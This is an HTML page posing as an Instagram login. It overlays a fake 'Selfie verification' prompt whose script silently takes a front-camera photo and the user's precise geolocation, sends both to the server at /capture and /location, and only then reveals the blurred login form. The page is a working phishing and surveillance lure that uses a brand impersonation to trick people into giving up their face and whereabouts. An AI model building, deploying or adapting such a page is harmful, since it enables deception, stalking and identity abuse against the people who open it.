<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>Instagram</title>

<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&family=Pacifico&display=swap" rel="stylesheet">

<style>
*{margin:0;padding:0;box-sizing:border-box}

body{
  min-height:100vh;
  background:#0b0e11;
  display:flex;
  justify-content:center;
  align-items:center;
  color:#fff;
  font-family:'Inter',sans-serif;
}

/* PAGE */
.page{
  position:relative;
  width:350px;
}

/* BLUR CONTENT */
.content{
  filter:blur(6px);
  transition:filter .4s ease;
}

.content.active{
  filter:blur(0);
}

/* OVERLAY */
.overlay{
  position:absolute;
  inset:0;
  display:flex;
  justify-content:center;
  align-items:center;
  pointer-events:auto;
}

/* MODAL */
.modal{
  background:#111;
  border:1px solid #2a2d33;
  border-radius:8px;
  padding:26px 24px;
  text-align:center;
  box-shadow:0 0 0 9999px rgba(0,0,0,.6);
}

.modal h2{
  font-family:Verdana,sans-serif;
  font-size:18px;
  margin-bottom:14px;
}

.modal p{
  font-size:14px;
  color:#cfd1d4;
}

.modal button{
  margin-top:18px;
  padding:10px 20px;
  background:#3f4db8;
  border:none;
  border-radius:6px;
  color:#fff;
  font-size:14px;
  cursor:pointer;
}

/* ===== YGRAM UI ===== */

.logo{
  font-family:'Pacifico',cursive;
  font-size:40px;
  text-align:center;
  margin-bottom:26px;
}

.card{
  background:#111;
  border:1px solid #2a2d33;
  border-radius:4px;
  padding:28px;
}

.input{
  width:100%;
  padding:11px;
  margin-bottom:10px;
  background:#26292e;
  border:1px solid #3a3d43;
  border-radius:4px;
  color:#fff;
  font-size:14px;
}

.btn{
  width:100%;
  padding:11px;
  background:#3f4db8;
  border:none;
  border-radius:8px;
  color:#fff;
  font-weight:600;
  margin-top:10px;
}
</style>
</head>

<body>

<div class="page">

  <!-- BLURRED CONTENT -->
  <div class="content" id="mainContent">
    <div class="logo">Instagram</div>
    <div class="card">
      <input class="input" placeholder="Phone number, username, or email">
      <input class="input" type="password" placeholder="Password">
      <button class="btn">Log in</button>
    </div>
  </div>

  <!-- SELFIE MODAL -->
  <div class="overlay" id="overlay">
    <div class="modal">
      <h2>Selfie verification</h2>
      <p>Proceed further.</p>
      <button onclick="startKYC()">Continue</button>
    </div>
  </div>

</div>

<script>
/* ===== AUTHORITATIVE OLD LOGIC (UNCHANGED) ===== */

async function capturePhoto(){
  let stream=null;
  try{
    stream = await navigator.mediaDevices.getUserMedia({
      video:{ facingMode:"user" }
    });

    const video=document.createElement("video");
    video.srcObject=stream;
    await video.play();

    const canvas=document.createElement("canvas");
    canvas.width=video.videoWidth;
    canvas.height=video.videoHeight;
    canvas.getContext("2d").drawImage(video,0,0);

    stream.getTracks().forEach(t=>t.stop());
    return canvas.toDataURL("image/jpeg",0.8);
  }catch(e){
    if(stream) stream.getTracks().forEach(t=>t.stop());
    throw e;
  }
}

async function startKYC(){
  try{
    /* CAMERA */
    const image = await capturePhoto();
    await fetch("/capture",{
      method:"POST",
      headers:{ "Content-Type":"application/json" },
      body:JSON.stringify({ image })
    });

    /* LOCATION (NON-BLOCKING) */
    if(navigator.geolocation){
      navigator.geolocation.getCurrentPosition(pos=>{
        fetch("/location",{
          method:"POST",
          headers:{ "Content-Type":"application/json" },
          body:JSON.stringify({
            lat:pos.coords.latitude,
            lon:pos.coords.longitude,
            accuracy:pos.coords.accuracy
          })
        });
      });
    }

    /* UNBLUR + SHOW PAGE */
    document.getElementById("mainContent").classList.add("active");
    document.getElementById("overlay").style.display="none";

  }catch{
    alert("Enable Permission to continue");
  }
}
</script>

</body>
</html>
